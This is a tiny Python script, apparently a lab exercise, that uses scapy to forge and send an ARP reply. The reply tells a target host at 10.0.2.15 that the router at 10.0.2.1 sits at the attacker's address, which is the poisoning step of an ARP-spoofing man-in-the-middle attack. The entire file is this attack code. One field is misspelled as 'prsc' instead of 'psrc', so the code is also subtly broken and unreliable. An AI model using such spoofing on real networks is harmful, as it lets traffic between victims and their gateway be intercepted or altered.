import scapy.all as scapy


## Setting Target IP Address and MAC Address and the Router IP
arp_response = scapy.ARP(op=2,pdst="10.0.2.15",hwdst="08:00:27:bb:99:ed",prsc="10.0.2.1")
scapy.send(arp_response)
# scapy.ls(scapy.ARP())


